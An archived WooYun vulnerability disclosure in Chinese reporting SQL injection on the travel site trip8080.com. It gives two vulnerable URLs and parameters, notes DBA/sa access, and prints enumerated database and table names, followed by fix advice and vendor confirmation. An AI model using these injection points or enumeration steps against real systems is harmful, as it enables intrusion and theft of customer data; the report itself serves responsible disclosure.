<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		畅途网多处注射-数据大大的多  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		畅途网多处注射-数据大大的多  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小胖子">小胖子</a> 
</li><li>提交时间：		2013-03-31 20:58</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-03-31：	细节已通知厂商并且等待厂商处理中<br/>
									2013-03-31：	厂商已经确认，细节仅向厂商公开<br/>
									2013-04-10：	细节向核心白帽子及相关领域专家公开<br/>
									2013-04-20：	细节向普通白帽子公开<br/>
									2013-04-30：	细节向实习白帽子公开<br/>
									2013-05-15：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">这下数据就多得吓人了，速度修复，黑产牛们手下留情。还有sa。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">wap站也不能放松警惕啊！<br />
<br />
<br />
<br />
<br />
<br />
注入点1：http://100wap.trip8080.com/tbDetail.htm?currentPage=1&amp;hotFlag=&amp;stCity=%E5%8E%A6%E9%97%A8%E5%B8%82&amp;endCity=%E6%B7%B1%E5%9C%B3%E5%B8%82&amp;stCityId=70790&amp;endCityId=46&amp;pkTimetableId=1046556<br />
<br />
<br />
<br />
注入参数：pkTimetableId（其他参数也可能） 数据库类型：oracle <br />
<br />
<br />
<br />
22个数据库，貌似主站也一起被殃及到了啊。<br />
<br />
<br />
<br />
</p><pre><code>available databases [22]:<br />
[*] CTXSYS<br />
[*] DBSNMP<br />
[*] DMSYS<br />
[*] EXFSYS<br />
[*] MDSYS<br />
[*] OLAPSYS<br />
[*] ORDSYS<br />
[*] OUTLN<br />
[*] PROD<br />
[*] SCOTT<br />
[*] SYS<br />
[*] SYSMAN<br />
[*] SYSTEM<br />
[*] TSMSYS<br />
[*] TTS_CMS<br />
[*] TTS_COA<br />
[*] TTS_ECM<br />
[*] TTS_EXM<br />
[*] TTS_FND<br />
[*] TTS_HR<br />
[*] WMSYS<br />
[*] XDB</code></pre><p class='detail'><br />
<br />
<br />
<br />
当前注入点当前库：PROD  219个表，看到user什么的好开心。<br />
<br />
<br />
<br />
<br />
<br />
</p><pre><code>Database: PROD<br />
[219 tables]<br />
+--------------------------------+<br />
| CMS_ADVICES_ANS_LOG            |<br />
| CMS_ADVICE_ANS_LOG             |<br />
| CMS_ADVT_SHOWS                 |<br />
| CMS_ADV_STATISTICS_DAILY       |<br />
| CMS_CACHE_AREAS                |<br />
| CMS_CACHE_DATASOURCE_METHODS   |<br />
| CMS_CACHE_DATASOURCE_TYPES     |<br />
| CMS_CACHE_DATA_TYPES           |<br />
| CMS_CACHE_SERVICE_TYPES        |<br />
| CMS_CTQCP_STATUS               |<br />
| CMS_IPS_TB3_SIN                |<br />
| CMS_IPS_UPDATE                 |<br />
| CMS_IP_INDEX                   |<br />
| CMS_MESSAGE_CLASSES            |<br />
| CMS_MESSAGE_PIPES              |<br />
| CMS_MESSAGE_RULE_CODES         |<br />
| CMS_MESSAGE_SEND_CLASSES       |<br />
| CMS_MSG_CLASSES                |<br />
| CMS_MSG_TYPES                  |<br />
| CMS_NEWS_STATUS                |<br />
| CMS_NOTICE_CLASSES             |<br />
| CMS_NOTICE_RANGES              |<br />
| CMS_PAGE_INLINE_CODES          |<br />
| CMS_PAY_STATUS                 |<br />
| CMS_RECYCLE_TYPE               |<br />
| CMS_SENSITIVE_CLASSES          |<br />
| CMS_TASK_CLASS                 |<br />
| CMS_TAST_PRIOR_GRADES          |<br />
| CMS_TAST_PROCESS_STATUS        |<br />
| CMS_WEATHER_PROVIDERS          |<br />
| COA_BUSY_CLASSES               |<br />
| COA_CUSTOMER_SUBJECTS          |<br />
| COA_DEFAULT_CONTENTS           |<br />
| COA_FEE_ITEMS                  |<br />
| COA_ORG_BUSYS                  |<br />
| COA_PAY_PLACES                 |<br />
| COA_SMS_COMMAND_CLASS          |<br />
| COA_SMS_RECE_STATUS            |<br />
| COA_SMS_SEND_PRIOR             |<br />
| COA_SMS_SEND_STATUS            |<br />
| ECM_ADVICE_LEVEL               |<br />
| ECM_ADVICE_TYPE_DETAILS        |<br />
| ECM_AGENTS_COPY                |<br />
| ECM_AGENT_BALANCE_LOGS         |<br />
| ECM_AGENT_EMPLOYEES_HIS        |<br />
| ECM_AGENT_MONEY_LOAD           |<br />
| ECM_AGENT_SUBJECTS             |<br />
| ECM_AGENT_TYPES                |<br />
| ECM_AGENT_WSIPS                |<br />
| ECM_ARAP_CLASSES               |<br />
| ECM_ARAP_CLASS_DETAILS         |<br />
| ECM_ARAP_STATUSES              |<br />
| ECM_BANK_CLASSES               |<br />
| ECM_BLOOD_TYPES                |<br />
| ECM_BOOK_NODES                 |<br />
| ECM_BORN_ANIMALS               |<br />
| ECM_BUSINESS_TYPES             |<br />
| ECM_BUSY_CODE                  |<br />
| ECM_CACHE_DEL_STATUS           |<br />
| ECM_CITIES_LEVEL4              |<br />
| ECM_CITIES_OLD                 |<br />
| ECM_CITY_ATTR                  |<br />
| ECM_CITY_SCH_PLANS1            |<br />
| ECM_CITY_SCH_PLANS2            |<br />
| ECM_CITY_SMS_SOURCE            |<br />
| ECM_COMING_CITY                |<br />
| ECM_CONSTELLATIONS             |<br />
| ECM_COUPON_BUSYS               |<br />
| ECM_COUPON_PROCESSES           |<br />
| ECM_COUPON_SOURCES             |<br />
| ECM_COUPON_STATUS              |<br />
| ECM_COUPON_SUBJECTS            |<br />
| ECM_COUPON_USES                |<br />
| ECM_CRITICAL_RULES             |<br />
| ECM_DATALOAD_CLASSES           |<br />
| ECM_DATALOAD_STATUSES          |<br />
| ECM_DOCUMENT_TYPES             |<br />
| ECM_EDU_LEVELS                 |<br />
| ECM_ELEMENT_COLUMNS            |<br />
| ECM_EXPRESS_ACCOUNT_SUBJECTS   |<br />
| ECM_EXPRESS_BALANCES_LOG       |<br />
| ECM_EXPRESS_EMPLOYEES_HIS      |<br />
| ECM_EXP_STATUS                 |<br />
| ECM_FORMULA_FACTOR_CLASSES     |<br />
| ECM_FUTTS034_GTAB              |<br />
| ECM_FUTTS049S_GTAB             |<br />
| ECM_FUTTS049_GTAB              |<br />
| ECM_FUTTS050_GTAB              |<br />
| ECM_FUTTS053_GTAB              |<br />
| ECM_GETSCH_TYPES               |<br />
| ECM_HOTROUTE_AREA              |<br />
| ECM_HOTSTART_ORDER_MV          |<br />
| ECM_HOTSTART_TIMETABLE_MV      |<br />
| ECM_INTERFACE_DATA_DEAL        |<br />
| ECM_INTERFACE_REFLECT_MODELS   |<br />
| ECM_INTERFACE_STATION_MODELS   |<br />
| ECM_JOBS                       |<br />
| ECM_MAPS                       |<br />
| ECM_MAP_TYPES                  |<br />
| ECM_MATCH_DETAILS              |<br />
| ECM_MEMBER_ACCOUNT_SUBJECTS    |<br />
| ECM_MEMBER_ACTIONS_BAK         |<br />
| ECM_MEMBER_ACTION_AWARDS       |<br />
| ECM_MEMBER_ACTION_CLASSES      |<br />
| ECM_MEMBER_ADDRESSES_BEIFEN    |<br />
| ECM_MEMBER_EXP_SUBJECTS        |<br />
| ECM_MEMBER_IDENTITIES          |<br />
| ECM_MEMBER_INT_SUBJECTS        |<br />
| ECM_MEMBER_MEDIA               |<br />
| ECM_MEMBER_OC_PARA             |<br />
| ECM_MEMBER_SOURCES             |<br />
| ECM_MEMBER_TYPES               |<br />
| ECM_OPEN_PAYS                  |<br />
| ECM_ORDER_BOOK_REMARKS         |<br />
| ECM_ORDER_FAIL_TYPES           |<br />
| ECM_ORDER_INTERFACES           |<br />
| ECM_ORDER_REV_ELEMENTS         |<br />
| ECM_ORDER_SOURCES              |<br />
| ECM_ORDER_STATUS               |<br />
| ECM_PAGE_LOCATION              |<br />
| ECM_PARTNER_TYPES              |<br />
| ECM_PAYCODE_GROUP_ZJ           |<br />
| ECM_PAY_ACTION_STATUS          |<br />
| ECM_PAY_CLASSES                |<br />
| ECM_PAY_STATUS                 |<br />
| ECM_PICTURE_SOURCE_TYPES       |<br />
| ECM_POOL_TICKET_STATUSES       |<br />
| ECM_PRE_TICKET                 |<br />
| ECM_PROMPT_CLASSES             |<br />
| ECM_PROVINCES_OLD              |<br />
| ECM_PROVINCE_TYPES             |<br />
| ECM_PRO_VOUCHER_MODEL          |<br />
| ECM_PRO_VOUCHER_PLACE          |<br />
| ECM_REMARKS                    |<br />
| ECM_RESP_CLASSES               |<br />
| ECM_REV_ELEMENT_RULES          |<br />
| ECM_ROUTE_LINES_OLD            |<br />
| ECM_SEND_MODELS                |<br />
| ECM_SETTLE_STATUSES            |<br />
| ECM_STATIONS_OLD               |<br />
| ECM_STATION_BAK                |<br />
| ECM_STATION_CACHE_RATES        |<br />
| ECM_STATION_NEW                |<br />
| ECM_STATION_STATES             |<br />
| ECM_STATION_UPDATE             |<br />
| ECM_TICKET_APPLY_STATUS        |<br />
| ECM_TICKET_APPLY_STATUSES      |<br />
| ECM_TICKET_ORDER_DETAILS_HIS   |<br />
| ECM_TICKET_ORDER_DETAILS_LOGS  |<br />
| ECM_TICKET_ORDER_PREMIUM_LOGS1 |<br />
| ECM_TICKET_ORDER_TTS           |<br />
| ECM_TICKET_POOLS_GTAB          |<br />
| ECM_TICKET_POOLS_GTAB1         |<br />
| ECM_TICKET_STATUS              |<br />
| ECM_TIMETABLES_OLD             |<br />
| ECM_TIMETABLE_DEFINES_T        |<br />
| ECM_TTS201_GTAB                |<br />
| ECM_TTSZCL004                  |<br />
| ECM_USER_SATISFACTIONS         |<br />
| ECM_WANGTTS022                 |<br />
| ECM_ZGT_ROUTE_LINES            |<br />
| EXM_APPRE_REQUEST_SUM_OLD      |<br />
| EXM_APPRE_STATIONS_OLD         |<br />
| EXM_APPRE_SUM_OLD              |<br />
| EXM_APPRE_TIMETABLES_OLD       |<br />
| EXPRESS_AGENT_OLDID_NEWID      |<br />
| FND_APPLICATION_DISPLAYS       |<br />
| FND_BCODE_SIGNS                |<br />
| FND_BCODE_SPLITS               |<br />
| FND_BLN_CLASSES                |<br />
| FND_CHANNEL_CLASS              |<br />
| FND_CHART_TYPES                |<br />
| FND_INTERFACE_CLASS            |<br />
| FND_INTERFACE_USERS            |<br />
| FND_MAP_LINE_MODELS            |<br />
| FND_MAP_MODELS                 |<br />
| FND_MATH_OPERATORS             |<br />
| FND_METHOD_CLASSES             |<br />
| FND_MSG_TYPES                  |<br />
| FND_OPERATE_POWERS             |<br />
| FND_OPTION_ATTRIBUTES          |<br />
| FND_ORACLE_DATA_TYPES          |<br />
| FND_ORA_JAVA_DATATYPES         |<br />
| FND_ORA_SQLERRS                |<br />
| FND_ORG_BUSY_CLASSES           |<br />
| FND_ORG_CHANGES                |<br />
| FND_ORG_CLASSES                |<br />
| FND_PARA_VAL_TYPES             |<br />
| FND_PLAN_QUENS                 |<br />
| FND_REGISTER_SOURCES           |<br />
| FND_REPROT_STATUSES            |<br />
| FND_ROLES                      |<br />
| FND_ROLE_FUNC                  |<br />
| FND_ROLE_USERS                 |<br />
| FND_SERVICE_PURPOSES           |<br />
| FND_SMS_CLASS                  |<br />
| FND_TABLE_CLASSES              |<br />
| FND_TASK_SOURCE_TYPES          |<br />
| FND_TIME_UOMS                  |<br />
| FND_USER_GRADE                 |<br />
| FND_USER_SET_LISTS             |<br />
| FND_USER_SOURCES               |<br />
| FND_WARN_MODELS                |<br />
| FND_WARN_PRODUCE_TYPES         |<br />
| FND_WEEK_DAYS                  |<br />
| FND_WORKFLOW_STATUSES          |<br />
| GET_DATE                       |<br />
| HR_EMP_LEVELS                  |<br />
| INTERFACE_CLASS                |<br />
| NEW_OLD_OPERATOR               |<br />
| REPLACE_STATIONS               |<br />
| ROUTE_TIMETABLES_CTQCP         |<br />
| SCHEDULE_PLAN_CLASSES          |<br />
| STS_AUDIT_STATUS               |<br />
| TIMETABLES_JS                  |<br />
| T_ECM_STATION_INTERFACES       |<br />
| T_ECM_STATION_MAPS             |<br />
| T_TEST                         |<br />
| WZ_USERS                       |<br />
+--------------------------------+</code></pre><p class='detail'><br />
<br />
<br />
<br />
其他不一一列举。<br />
<br />
<br />
<br />
注入点2：http://3g.trip8080.com/chepiao/querySch.htm?stCityInfo=%25E5%258C%2597%25E4%25BA%25AC%25E5%25B8%2582%2C1&amp;carryStaId=-1&amp;busStopId=310000&amp;busStopName=%25E4%25B8%258A%25E6%25B5%25B7&amp;planDate=20130331&amp;timeSta=00%3A00-24%3A00-d<br />
<br />
<br />
<br />
注入参数：carryStaId（其他参数也可能） 数据库类型：Microsoft SQL Server 2008<br />
<br />
<br />
<br />
DBA权限（这个太危险）。<br />
<br />
<br />
<br />
数据不一一读取了，对你们不好，对我也不好，适可而止，及时报送修复。<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/312054016e4cafe5bce35985f0d43a60df8b4da1.jpg" target="_blank"><img src="../images/312054016e4cafe5bce35985f0d43a60df8b4da1.jpg" alt="QQ截图20130331205335.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">见详细说明。 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">1：注入点2数据库降权，sa权限成何体统，过滤。<br />
<br />
2：注入点1过滤啊过滤，wap站也不能疏忽。<br />
<br />
3:后台地址修改吧。<br />
<br />
4：rank必须20有木有！！！礼物什么的有木有！！！！ </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小胖子" title="小胖子">小胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021035" title="畅途网多处注射-数据大大的多">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-03-31 21:55</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">非常感谢</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="21035";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
